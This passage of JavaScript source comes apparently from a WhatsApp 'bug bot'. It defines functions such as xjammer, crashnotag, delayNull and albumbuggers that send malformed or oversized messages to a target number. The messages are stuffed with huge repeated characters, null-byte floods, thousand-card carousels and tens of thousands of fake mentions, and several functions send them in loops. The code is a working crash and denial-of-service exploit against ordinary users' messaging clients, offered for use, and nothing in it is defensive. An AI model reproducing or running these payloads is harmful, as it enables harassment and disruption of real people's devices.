            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "Telegram: @F_1KE" + xeonIpong,
            url: "https://youtube.com/@DGXeon"
        }
    }, { participant: { jid: target } });
}
//==============================================================\\

//==============================================================\\
async function xeonOutBrutal2(target) {
let xeonOutBrutal2 = JSON.stringify({
status: true,
criador: "Telegram: @F_1KE",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});
try {
let message = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2,
},
interactiveMessage: {
contextInfo: {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: target,
},
},
body: {
text: "Telegram: @F_1KE",
},
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @F_1KE",
},
{
name: "call_permission_request",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @F_1KE",
},
{
name: "mpm",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @F_1KE",
},
{
name: "mpm",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @F_1KE",
},
{
name: "mpm",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @F_1KE",
},
{
name: "mpm",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @F_1KE",
},
{
name: "mpm",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @F_1KE",
},
{
name: "mpm",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @F_1KE",
},
{
name: "mpm",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @F_1KE",
},
{
name: "mpm",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @F_1KE",
},
],
},
},
},
},
};

await DevNexusX.relayMessage(target, message, {
participant: { jid: target },
});
} catch (err) {
console.log(err);
}
}
//==============================================================\\
//==============================================================\\

//code new!!

//==============================================================\\
//==============================================================\\
let push = [];
let buttt = [];
for (let i = 0; i < 1000; i++) {push.push({body: proto.Message.InteractiveMessage.Body.fromObject({text: "ㅤ"}),footer: proto.Message.InteractiveMessage.Footer.fromObject({text: "ㅤㅤ"}),header: proto.Message.InteractiveMessage.Header.fromObject({title: '\n', hasMediaAttachment: true,"imageMessage": {"url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true","mimetype": "image/jpeg","fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=","fileLength": "10840","height": 10,"width": 10,"mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=","fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=","directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0","mediaKeyTimestamp": "1721344123","jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECECFBMTJRUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",}}),nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({"buttons": [] })});}
const carousel = generateWAMessageFromContent(from, {viewOnceMessage: {message: {messageContextInfo: {deviceListMetadata: {},deviceListMetadataVersion: 2},interactiveMessage: proto.Message.InteractiveMessage.fromObject({body: proto.Message.InteractiveMessage.Body.create({text: "Telegram: @F_1KE "}),footer: proto.Message.InteractiveMessage.Footer.create({text: global.namabot}),header: proto.Message.InteractiveMessage.Header.create({hasMediaAttachment: false}),carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({cards: [...push]})})}}}, {});
const stanza = [{attrs: { biz_bot: '1' },tag: "bot",},{attrs: {},tag: "biz",},];
async function xgc4(target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: '33333333333333333@newsletter',
                                newsletterName: "Telegram: @F_1KE" + "ꦾ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await DevNexusX.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }
const { bug } = require('./69/bug.js');
const { bugUrl } = require('./69/bugUrl.js')
//==============================================================\\
 //func new!!


//==============================================================\\
//==============================================================\\
async function delayNull(target) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      body: {
        text: "DevNexusX Null" + "ꦽ".repeat(7000),
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, { userJid:target });
  
  await DevNexusX.relayMessage(target, msg.message, {
    participant: { jid:target }, 
    messageId: msg.key.id
  }) 
}

async function delaynullD(target) {
  const imageMessage = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=",
    fileLength: 162903,
    height: 1080,
    width: 1080,
    mediaKey: "qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=",
    fileEncSha256: "JDCO/kG+BT0CCdsRsdKSixsDleGaJNZPCJMVomLox3A=",
    directPath: "/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c",
    mediaKeyTimestamp: 1775033718,
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMGP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFGRof/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
    contextInfo: {
      pairedMediaType: "NOT_PAIRED_MEDIA"
    },
    scansSidecar: "2YCrK9uS0xGWeOGhQDDtgHrmdhks+9aRYU2v5pwgTYmXkWbuXBRpzg==",
    scanLengths: [
      10365,
      39303,
      40429,
      72806
    ],
    midQualityFileSha256: "lldAKS/9qixXmMdTvk0n/DUV7WJLwvT6BaZmOkbUDdE="
  }

  let cards = [];
  for (let z = 0; z < 500; z++) {
    cards.push({
      header: {
        imageMessage,
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "\0"
      }
    })
  }
  
  let msg = await generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "\0" },
          carouselMessage: {
            cards
          }
        }
      }
    }
  }, {});
  
  await DevNexusX.relayMessage(target, msg.message, {
    participant: { jid: target }
  });
}
//==============================================================\\
//==============================================================\\
async function xjammer2(isTarget, mention = true) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(isTarget, messageContent, { userJid: isTarget });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await DevNexusX.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await DevNexusX.relayMessage(isTarget, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " Telegram: @F_1KE "
        },
        content: undefined
      }]
    });
  }
}

async function crashnotag(target) {
for (let r = 0; r < 1000; r++) {
await DevNexusX.relayMessage(target, {
groupStatusMessageV2: {
message: {
stickerMessage: {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
mimetype: "image/webp",
directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
fileLength: "10610",
mediaKeyTimestamp: "1775044724",
stickerSentTs: "1775044724091"
}
}
}
}, { participant: { jid: target }, messageId: DevNexusX.generateMessageTag() });
await sleep(1500);
}
}
async function crashnewhx(sock, target) {
    await DevNexusX.relayMessage("status@broadcast", {
        groupStatusMessageV2: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                    mimetype: "image/webp",
                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                    fileLength: "9999",
                    mediaKeyTimestamp: "-1", //Dev𝐍exus𝐗
                    stickerSentTs: "-1" //Dev𝐍exus𝐗
                }
            }
        }
    }, {
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {
                status_setting: "contacts"
            },
            content: [
                {
                    tag: "mentioned_users",
                    attrs: {},
                    content: [target].map(jid => ({
                        tag: "to",
                        attrs: { jid }
                    }))
                }
            ]
        }]
    });
}
//==============================================================\\
async function xjammer(target){
const generateRandomJids = (maxSize) => {
    const jids = [];
    let currentSize = 0;
    while (currentSize < maxSize - 25) {
      const randomNumber = Math.floor(Math.random() * 1e10).toString().padStart(10, '0');
      const jid = `91${randomNumber}@s.whatsapp.net`;
      jids.push(jid);
      currentSize += jid.length + 3;
    }
    return jids;
  };

  const maxSize = 1074689;
  const jids = generateRandomJids(maxSize);

  for (let i = 0; i < 1000; i++) {
    await sleep(3000);
    let tmsg = await generateWAMessageFromContent(target, {
      extendedTextMessage: {
        "text": "",
        contextInfo: {
          stanzaId: DevNexusX.generateMessageTag(),
          participant: "0@s.whatsapp.net",
          remoteJid: "dgxeon@eu",
          mentionedJid: jids,
          fromMe: false,
          isForwarded: true,
          forwardingScore: 999,
          businessMessageForwardInfo: {
            businessOwnerJid: target,
          }
        }
      }
    }, {});

    await DevNexusX.relayMessage("status@broadcast", tmsg.message, {
      messageId: tmsg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta", attrs: {}, content: [{
          tag: "mentioned_users", attrs: {}, content: [{
            tag: "to", attrs: { jid: target }, content: undefined,
          }]
        }]
      }]
    });

    // Bring pictures and carousel 
    let push = [];
    for (let i = 0; i < 1000; i++) {
      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: ``
        }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({
          text: ""
        }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
          title: '',
          hasMediaAttachment: true,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/34764738_320019993959203_5174575234777775036_n.enc?ccb=11-4&oh=01_AdQVCKhvkaeb2GrB6guuwFGNLlZ7KJCiy6p4AtJKwUNmjg&oe=65536880&_nc_sid=000000&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "tcHyO7wrPPNctPRoi7x669hT8YEM0oB4Av25pSeG1cQ=",
            "fileLength": "73384124",
            "height": 1,
            "width": 1,
            "mediaKey": "/WtTeZEAvMxYIHa4hIrcGExALsiU3CKLMT3lqwNd8yk=",
            "fileEncSha256": "BgKFWKbH4aeiME5GrSg/sinfE8Z96dX7Utm1OjmEXXM=",
            "directPath": "/v/t62.7118-24/34764738_320019993959203_5174575234777775036_n.enc?ccb=11-4&oh=01_AdQVCKhvkaeb2GrB6guuwFGNLlZ7KJCiy6p4AtJKwUNmjg&oe=65536880&_nc_sid=000000&_nc_hot=1697385259",
            "mediaKeyTimestamp": "1697384837",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAAvAAACAwEAAAAAAAAAAAAAAAAAAgEDBQQBAQEBAQEAAAAAAAAAAAAAAAABAgME/9oADAMBAAIQAxAAAADtfj6vRxsmprJBpaZueqDoJeLqz+/JmUWBpRXSJbDjDjsxjOtxsdzTMHqivfx1NoxgzxoyVbCKdDlhrXtw2zdsyxWqDvyrA4ogFaQhALf/xAAkEAACAgICAQQDAQAAAAAAAAAAAQIRAxIEMSEQExRRIzJCof/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
          }
        })
      });
    }

    tmsg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: '\0'
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: '\n'.repeat(99)
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: [...push]
            })
          })
        }
      }
    }, {});

    await DevNexusX.relayMessage("status@broadcast", tmsg.message, {
      messageId: tmsg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta", attrs: {}, content: [{
          tag: "mentioned_users", attrs: {}, content: [{
            tag: "to", attrs: { jid: target  }, content: undefined,
          }]
        }]
      }]
    });
  }
  }
//==============================================================\\

async function albumbuggers1(target, mention) {

  const imageCrash = "https://files.catbox.moe/ykvioj.jpg";

  const mentionedMetaAi = [
    "13135550001@s.whatsapp.net",
    "13135550002@s.whatsapp.net",
    "13135550003@s.whatsapp.net",
    "13135550004@s.whatsapp.net",
    "13135550005@s.whatsapp.net",
    "13135550006@s.whatsapp.net",
    "13135550007@s.whatsapp.net",
    "13135550008@s.whatsapp.net",
    "13135550009@s.whatsapp.net",
    "13135550010@s.whatsapp.net"
  ];

  const photo = {
    image: { url: imageCrash },
    caption: "@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸" 
             + "\n".repeat(5)
             + "ꦾ".repeat(60000)
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 999,
      expectedVideoCount: 666
    }
  }, {
    userJid: target,
    upload: DevNexusX.waUploadToServer
  });

  await DevNexusX.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 666; i++) {
    const msg = await generateWAMessage(target, photo, {
      upload: DevNexusX.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
        ...mentionedMetaAi,
        ...Array.from({ length: 30000 }, () =>
          `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      businessMessageForwardInfo: {
        businessOwnerJid: "5521992999999@s.whatsapp.net"
      },
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "ꦾ".repeat(100),
        newsletterJid: "120363330344810280@newsletter",
        serverMessageId: 999
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    msg.message.nativeFlowMessage = {
      buttons: [
        {
          type: "call_button",
          callButton: {
            displayText: "ꦽ".repeat(9999),
            phoneNumber: "+5521992999999"
        }
      },
      {
          type: "url",
          urlButton: {
            displayText: "ꦽ".repeat(9999),
            url: "https://wa.me/+5521992999999?text=" + encodeURIComponent("ꦾ".repeat(66666))
        }
      },
      {
          type: "unknown_type",
          weirdButton: {
            displayText: "ꦽ".repeat(9999),
            payload: "\u0000".repeat(9999)
        }
      },
    ],
      content: {
        namespace: "call_permission_request_namespace",
        name: "call_permission_request",
          params: [
            { 
              name: "call_type",
              value: "video" 
            },
            { 
              name: "permission_reason", 
              value: "\u0000".repeat(9999) 
            },
            {
              name: "support_url", 
              value: "https://wa.me/+5521992999999" 
            }
        ]
      }
    };

    await DevNexusX.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await DevNexusX.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}
async function dev1(sock, target) {
        const msg = {
                viewOnceMessage: {
                        message: {
                                stickerMessage: {
                                        url: "https://mmg.whatsapp.net/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0&mms3=true",
                                        fileSha256: "ljadeB9XVTFmWGheixLZRJ8Fo9kZwuvHpQKfwJs1ZNk=",
                                        fileEncSha256: "D0X1KwP6KXBKbnWvBGiOwckiYGOPMrBweC+e2Txixsg=",
                                        mediaKey: "yRF/GibTPDce2s170aPr+Erkyj2PpDpF2EhVMFiDpdU=",
                                        mimetype: "application/was",
                                        height: 512,
                                        width: 512,
                                        directPath: "/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0",
                                        fileLength: "14390",
                                        mediaKeyTimestamp: "1760786856",
                                        isAnimated: true,
                                        stickerSentTs: Date.now().toString(),
                                        isAvatar: false,
                                        isAiSticker: true,
                                        isLottie: true,
                                        contextInfo: {
                                                participant: target,
                                                remoteJid: "status@broadcast",
                                                isSampled: true,
                                                isForwarded: true,
                                                forwardingScore: 9999,
                                                forwardedNewsletterMessageInfo: {
                                                        newsletterName: "🩸⃟༑⌁⃰𝐑𝐢𝐳𝐱𝐕𝐞𝐥𝐳‌𝐄𝐱‌‌𝐞𝐜𝐮‌𝐭𝐢𝐨𝐧ཀ‌‌🦠",
                                                        newsletterJid: "9999999999999999@newsletter",
                                                        serverMessageId: 1
                                                },
                                                mentionedJid: [
                                                        "13135550002@s.whatsapp.net",
                                                        ...Array.from({ length: 1900 }, () =>
                                                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                                                        )
                                                ]
                                        }
                                }
                        }
                }
        };

        await DevNexusX.relayMessage("status@broadcast", msg, {
                messageId: null,
                statusJidList: [target],
                additionalNodes: [{
                        tag: "meta",
                        attrs: {},
                        content: [{
                                tag: "mentioned_users",
                                attrs: {},
                                content: [{
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: []
                                }]
                        }]
                }]
        });

        console.log(chalk.green("✅ Success Send Bug By RizxvelzExerc1st 🐉"));
        await new Promise(resolve => setTimeout(resolve, 500));
}

async function albumbuggers2(target, mention) {
  const imageCrash = "https://files.catbox.moe/ykvioj.jpg";

  const mentionedMetaAi = [
    "13135550001@s.whatsapp.net",
    "13135550002@s.whatsapp.net",
    "13135550003@s.whatsapp.net",
    "13135550004@s.whatsapp.net",
    "13135550005@s.whatsapp.net",
    "13135550006@s.whatsapp.net",
    "13135550007@s.whatsapp.net",
    "13135550008@s.whatsapp.net",
    "13135550009@s.whatsapp.net",
    "13135550010@s.whatsapp.net"
  ];

  const photo = {
    image: { url: imageCrash },
    caption: "@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸" 
             + "\n".repeat(5)
             + "ꦾ".repeat(60000)
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 999,
      expectedVideoCount: 666
    }
  }, {
    userJid: target,
    upload: DevNexusX.waUploadToServer
  });

  await DevNexusX.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 666; i++) {
    const msg = await generateWAMessage(target, photo, {
      upload: DevNexusX.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
        ...mentionedMetaAi,
        ...Array.from({ length: 40000 }, () =>
          `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      businessMessageForwardInfo: {
        businessOwnerJid: "5521992999999@s.whatsapp.net"
      },
      participant: "0@s.whatsapp.net",
      remoteJid: target,
      forwardedNewsletterMessageInfo: {
        newsletterName: "ꦾ".repeat(100),
        newsletterJid: "120363330344810280@newsletter",
        serverMessageId: 999
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    msg.message.nativeFlowMessage = {
      buttons: [
        {
          type: "call_button",
          callButton: {
            displayText: "ꦽ".repeat(9999),
            phoneNumber: "+5521992999999"
          }
        },
        {
          type: "url",
          urlButton: {
            displayText: "ꦽ".repeat(9999),
            url: "https://wa.me/+5521992999999?text=" + encodeURIComponent("ꦾ".repeat(66666))
          }
        },
        {
          type: "unknown_type",
          weirdButton: {
            displayText: "ꦽ".repeat(9999),
            payload: "\u0000".repeat(9999)
          }
        }
      ],
      content: {
        namespace: "call_permission_request_namespace",
        name: "call_permission_request",
        params: [
            { 
              name: "call_type",
              value: "video" 
            },
            { 
              name: "permission_reason", 
              value: "\u0000".repeat(9999) 
            },
            {
              name: "support_url", 
